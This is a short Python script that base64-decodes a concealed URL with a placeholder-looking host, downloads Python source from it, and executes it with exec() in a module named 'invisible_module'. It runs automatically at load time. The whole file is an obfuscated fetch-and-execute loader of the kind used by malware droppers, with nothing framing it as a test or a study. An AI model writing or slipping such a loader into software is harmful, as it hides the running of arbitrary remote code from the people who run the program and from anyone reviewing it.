import urllib.request
import types
import base64

def get_source_code(url):
    with urllib.request.urlopen(url) as response:
        source = response.read().decode('utf-8')
    return source

def obscure_method():
    encoded_url = "aHR0cDovL21vY2stcHl0aG9uL2V4ZWN1dGUucHk="
    decoded_url = base64.b64decode(encoded_url).decode('utf-8')
    source = get_source_code(decoded_url)
    module = types.ModuleType("invisible_module")
    exec(source, module.__dict__)

obscure_method()
